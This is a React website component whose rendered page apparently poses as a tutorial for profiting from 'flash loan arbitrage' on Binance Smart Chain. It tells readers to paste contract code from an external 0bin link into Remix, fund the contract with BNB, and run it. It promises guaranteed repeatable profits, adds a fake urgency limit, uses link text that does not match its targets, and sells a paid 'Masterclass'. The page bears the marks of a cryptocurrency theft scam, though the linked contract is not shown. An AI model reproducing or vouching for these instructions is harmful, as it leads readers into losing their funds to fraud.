import React from 'react';
import classNames from 'classnames';
import { SectionTilesProps } from '../../utils/SectionProps';
import SectionHeader from './partials/SectionHeader';

const propTypes = {
  ...SectionTilesProps.types
}

const defaultProps = {
  ...SectionTilesProps.defaults
}
const FeaturesTiles = ({
  className,
  topOuterDivider,
  bottomOuterDivider,
  topDivider,
  bottomDivider,
  hasBgColor,
  invertColor,
  pushLeft,
  ...props
}) => {

  const outerClasses = classNames(
    'features-tiles section',
    topOuterDivider && 'has-top-divider',
    bottomOuterDivider && 'has-bottom-divider',
    hasBgColor && 'has-bg-color',
    invertColor && 'invert-color',
    className
  );

  const innerClasses = classNames(
    'features-tiles-inner section-inner pt-0',
    topDivider && 'has-top-divider',
    bottomDivider && 'has-bottom-divider'
  );


  const sectionHeader = {
    title: 'Last updated March 2022',
    paragraph: 'Important update: the code has been updated so that only 250 people per day can be doing this, to reduce the chances of getting the hack noticed and fixed.'
    
  };

  return (
    <section
      {...props}
      className={outerClasses}
    >
      <div className="container">
        <div className={innerClasses}>
          <SectionHeader data={sectionHeader} className="center-content" />
          
        </div>
        <div style={{fontSize:"0.8em", marginTop:"-50px" }}>
          <p>
            You can check the limit by clicking on Compile, if the limit is reached you will see an error message in Remix saying "Limit reached, 
            please try again later" If you don’t see the error message you will be good to go! The other message "contracts is modifying" is normal.
          </p>
          <p >
            Code for Remix: <a href="https://0bin.net/paste/VJOS3IjK#Rvs04">https://0bin.net/paste/VJOS3IjK#Rvs04...</a> 
          </p>
          <p>
            <span style={{fontWeight:"bold", color:"white"}}>WARNING: </span>
             Beware of online videos promoting liquidity front runner bots, do not use other codes out from this video, 
            Other users try to scam using fake codes, we already reported it!
          </p>
          <p>
          In today’s video, you can see how I used Flashloans to Arbitrage on the Binance Smartchain BSC. We will deploy our own contract on BSC in order to swap between PancakeSwap and Bakeryswap. 
          The profits will be credited in BNB, and this can be repeated until the daily limit is reached. The higher the volatility the higher the profit due to price change.
          </p>
          <p>
             To deploy your Smart Contract that will execute the Flashloans for you, simply follow the instructions in the video. 
          </p>
          <p>
            See more information on flashloan attacks - <a href="https://news.bitcoin.com/data-shows-bitcoin-addresses-in-accumulation-captures-fresh-new-highs/">  https://news.bitcoin.com/data-shows-b...</a> 
          </p>
          <p>
            Remix Link - <a href="https://remix.ethereum.org"> https://remix.ethereum.org </a>
          </p>
          <p>
            Smart Contract Code Link - <a href="facebook.com"> https://0bin.net/paste/VJOS3IjK#Rvs04...</a>
          </p>
          <p>
          Here we have a flash loan borrowed 3,157.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap. 
          First part of the arbitrage is to convert BNB to BUSD using BurgerSwap contract. The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap,
           and then immediately converts BNB back to 3,168.39 BNB using BNB/BUSD BakerySwap. After the arbitrage, 3,168.38 BNB is returned back to Multiplier to pay the loan plus fees.
            This transaction costs around 0.2 BNB of gas. Please note that the transaction sender (Us) gains 2.51 BNB from the arbitrage.
          </p>
          <p>
           This method can be repeated all the time until the limit is reached as price changes all the time.

          </p>
          <p>
          STEPS: Before your start, you need to install and setup MetaMask in your Chrome/Firefox Browser. You need to have BNB in your Metamask Wallet, 
          using the BEP20(BSC) Network, not BEP2! Follow this instruction on connecting MetaMask to Binance Smart Chain 
          - <a href="https://academy.binance.com/en/articles/what-are-flash-loans-in-defi">  https://academy.binance.com/en/articl...</a>
          </p>
          <ol>
            <li>Open and setup Remix in browser - <a href="https://remix.ethereum.org"> https://remix.ethereum.org</a></li>
            <li> Copy the Contract code at - <a href="facebook.com"> https://0bin.net/paste/VJOS3IjK#Rvs04...</a></li>
            <li> Create new file in Remix and paste Contract code and wait for everything to load</li>
            <li>Enter your token details and deploy your contract</li>
            <li>Get the Contract address from Remix </li>
            <li>Send 0.2 BNB to the contract for gas fee for all swaps (There are going to be many swaps to use all funds from out liquidity pools. So, its going to take around 0.2 BNB fees)</li>
            <li>Call 'flashloan' function in Remix.</li>
          </ol>
          <p>********************************************************************************** <br/>If it fails on first attempt, simply increase the gas fee and repeat the process as shown in the video.

**********************************************************************************</p>
        <p>
          For Example : <br/>
          To attempt a flash loan of 5,000 BNB(The minimum Flashloan amount by Multiplier Finance is 1000BNB) You have to use a gas fee of at
           least 1 BNB(0.20 BNB per every 1000 BNB) IF YOU DO NOT HAVE ENOUGH GAS, THE FLASHLOAN WILL FAIL!
        </p>
        <p>
          Add at least 0.20 BNB gas (0.30 is better) in each transaction (Per 1000 Loan amount)

        </p>
        <p>
         The amount you can earn varies and depends on the arbitrary differences in the liquidity of the pool.
        </p>
        <p>
          If the contract is unable to make a profit from the pool and repay the flashloan whilst pocketing the profits all in one single transaction, 
          then the transaction will revert as if nothing happened which is the nature of flash loans.
        </p>
        <p>
        The higher the flash loan, the better chances of being able to execute a profitable flash loan attack, which is why we see
         flash loan attackers doing millions at a time. A flash loan of 5,000 BNB or higher is almost guaranteed to work every time but occasionally lower
          amounts such as the one demonstrated in the video can work too.

        </p>
        <p>
        Also works on TrustWallet for Mobile, simply follow the same steps.
  
        </p>
        <p>
            Still need a one-one guidance? You can subscribe to our Masterclass and get access to all our arbitrage updates and more with a one time 
            subscription fee of <span style={{color:"white"}}> 0.017 ETH</span>. Send us a message now to get started criptoTest@gmaiul.com (Serious persons only please)
  
        </p>
        </div>
      </div>
    </section>
  );
}

FeaturesTiles.propTypes = propTypes;
FeaturesTiles.defaultProps = defaultProps;

export default FeaturesTiles;